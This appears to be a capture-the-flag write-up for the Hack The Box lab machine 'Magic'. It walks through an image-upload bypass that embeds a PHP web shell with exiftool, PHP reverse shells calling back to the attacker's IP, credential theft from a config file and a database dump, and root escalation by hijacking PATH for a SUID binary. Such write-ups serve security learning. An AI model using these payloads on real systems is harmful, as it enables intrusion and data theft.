---
title: "HTB Magic Write-up"
date: 2020-05-02T00:00:00-00:00
summary: A write-up for Magic on hackthebox.eu
---

A write up for another HTB machine, Magic.

Starting off with a port scan, I noticed a web server running and began enumerating directories with gobuster.

```text
root@kali:~# nmap -Pn 10.10.10.185

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```text
root@kali:~# ./gobuster dir -u http://10.10.10.185 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php

/index.php (Status: 200)
/images (Status: 301)
/login.php (Status: 200)
/assets (Status: 301)
/upload.php (Status: 302)
```

Checking out the website a little bit, it appears to be some sort of image hosting application. The ability to upload images appears to be gated by `login.php`. I wasn’t able to view `upload.php` in my browser due to a redirect. However, after requesting the page with curl, I was able to view it locally.

```bash
curl http://10.10.10.185/upload.php > upload.html
```

After updating my pages href links and form to point back to `http://10.10.10.185`, the formatting returns. I am still redirected to the login page after trying to upload an image, which leads me to believe it didn’t work.

However, after seeing the paths of the images on the site’s main page `/images/uploads/<file>`, I tried navigating to where my image should be and it was indeed uploaded.

I immediately tried to upload a PHP web shell, but the file upload appears to only allow image file extensions. After doing a little reading on how to bypass file type restrictions, I had to do two things.

The first thing I needed to do was embed PHP code in my image’s metadata using `exiftool`. Here I’m embedding a simple PHP web shell in `image.png` comment field.

```text
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' image.png
```

Second, we simply need to change the file extension type to `image.php.png`. After uploading our web shell, we can visit it and see that we have limited access with the `www-data` user.

```text
curl -o - http://10.10.10.185/images/uploads/image.php.png?cmd=whoami

<cipher text>
���2tEXtComment<pre>www-data
���
IDATx�Ѕa�@�=������L�Q   Ҏ����w��D$�->jϤ��
<cipher text>
```

Our output isn’t very elegant, so I’d like to upgrade my shell to make enumeration a little bit easier. I created a second `image2.php.png`, but this time I embedded a PHP reverse shell.

```text
exiftool -Comment='<?php $sock=fsockopen("10.10.14.15",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>' image.php.png
```

After uploading the second shell and setting up a local netcat listener, request the page to create the reverse shell. After receiving the connection, I use python to create a slightly friendlier shell.

```text
root@kali:~# nc -nlvp 4242
listening on [any] 4242 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.185] 57914
/bin/sh: 0: can't access tty; job control turned off

$ whoami
www-data

$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/var/www/Magic/images/uploads$
```

Once I was able to browse around with a shell, I immediately found a database file containing credentials for the local MySQL database, close to `www-data` home/working directory.
```text
www-data@ubuntu:/var/www/Magic$ cat db.php5
 
<?php
class Database
{                                                                                                                                                 
    private static $dbName = 'Magic' ;                                                                                                            
    private static $dbHost = 'localhost' ;                                                                                                        
    private static $dbUsername = 'theseus';                                                                                                       
    private static $dbUserPassword = 'iamkingtheseus';
<snip>
```

`netstat` revealed that a MySQL database is indeed listening. Normally, I would just use the mysql CLI client to connect, but it was not installed. I checked which mysql binaries were avilable and decided to simply dump the database.

```text
www-data@ubuntu:/var/www/Magic$ ls -lh /usr/bin|grep mysql
-rwxr-xr-x  1 root root     3.5M Jan 21 06:10 mysql_config_editor
-rwxr-xr-x  1 root root     3.7M Jan 21 06:10 mysqladmin
-rwxr-xr-x  1 root root     3.7M Jan 21 06:10 mysqldump
-rwxr-xr-x  1 root root     3.7M Jan 21 06:10 mysqlshow


www-data@ubuntu:/var/www/Magic$ mysqldump -u theseus -p Magic > dump.sql
```

A mysql dump will contain all of the database queries required to rebuild the database. In our case, the dump contained a set of credentials for another user, `theseus`.

```text
www-data@ubuntu:/var/www/Magic$ cat dump.sql
<snip>
-- Dumping data for table `login`
--
/*!40000 ALTER TABLE `login` DISABLE KEYS */;
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
<snip>

www-data@ubuntu:/var/www/Magic$ su theseus
Password: Th3s3usW4sK1ng

theseus@ubuntu:/var/www/Magic$ whoami
theseus

theseus@ubuntu:/var/www/Magic$ cat ~/user.txt
<user_flag>
```

On to root privledge escalation, I added my keys and SSH’d as `theseus`. I was stuck for quite a bit and ended up relying on two enumeration scripts, `linpeas.sh` and `pspy64`.

https://github.com/DominicBreuker/pspy

https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite

Linpeas highlighted `/bin/sysinfo` as concerning, but I didn’t immediately understand why.

```text
theseus@ubuntu:~$ sh linpeas.sh
<snip>
[+] Readable files belonging to root and readable by me but not world readable
-rwsr-x--- 1 root users 22040 Oct 21  2019 /bin/sysinfo
<snip>
```

I spent a long time running other enumeration scripts and trying to understand how sysinfo works. Eventually after understanding fdisk and while monitoring command activity with `pspy64`, I noticed that `/bin/sysinfo` was relying on the `PATH` to find `fdisk` when running.

I created my own `fdisk` executable, which simply spawns a PHP reverse shell, and added it’s location to my current path. Executing `/bin/sysinfo` spawns the reverse shell.

```text
theseus@ubuntu:~$ echo '$sock=fsockopen("10.10.14.15",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);' > fdisk
theseus@ubuntu:~$ chmod 755 fdisk
theseus@ubuntu:~$ export PATH=/home/theseus:$PATH
theseus@ubuntu:~$ /bin/sysinfo
<snip>
```

We catch the reverse shell with a local listener and can read the root flag.

```text
root@kali:~# nc -nlvp 4242
listening on [any] 4242 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.185] 57914
/bin/sh: 0: can't access tty; job control turned off

$ whoami
root

$ cat /root/root.txt
<root_flag>
```